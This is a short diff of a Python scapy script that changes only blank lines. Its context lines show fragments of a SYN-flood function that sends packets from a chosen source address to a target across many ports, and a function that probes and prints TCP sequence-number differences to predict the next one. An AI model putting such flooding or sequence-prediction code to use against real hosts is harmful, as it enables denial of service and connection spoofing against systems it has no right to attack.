@@ -1,7 +1,6 @@
 import optparse
 from scapy.all import *
 
-
 def synFlood(src, tgt):
     for sport in range(1024, 65535):
         IPlayer = IP(src=src, dst=tgt)
@@ -23,6 +22,7 @@ def calTSN(tgt):
         seqNum = ans.getlayer(TCP).seq
         diffSeq = seqNum - preNum
         print('[+] TCP Seq Difference: ' + str(diffSeq))
+        
     return seqNum + diffSeq
 
 
